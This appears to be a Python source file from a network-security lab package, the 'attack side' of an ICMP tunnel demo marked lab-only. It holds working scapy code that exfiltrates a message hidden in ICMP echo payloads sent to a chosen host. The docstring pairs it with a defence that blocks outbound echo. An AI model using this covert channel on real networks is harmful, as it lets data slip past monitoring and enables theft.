# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Chris <goabonga@pm.me>

"""Attack side of netlab-icmptunnel: exfiltrate data in ICMP echo payloads. LAB ONLY.

Sends ping packets whose payload carries the data; a receiver reassembles it. It
looks like ordinary ping. Blocking / inspecting outbound echo (see tunnel.py)
contains it.
"""

from __future__ import annotations

import argparse

from netlab_core import verdict
from netlab_core.sniffing import load_scapy

from netlab_icmptunnel.tunnel import encode


def run(args: argparse.Namespace) -> int:
    s = load_scapy()
    chunks = encode(args.message.encode())
    print(f"[*] exfiltrating {args.message!r} over {len(chunks)} ICMP echo packets to {args.dst}")
    for chunk in chunks:
        s.send(s.IP(dst=args.dst) / s.ICMP(type=8) / s.Raw(chunk), verbose=0)
    verdict("ALERT", f"sent {len(chunks)} covert echo packets")
    return 0
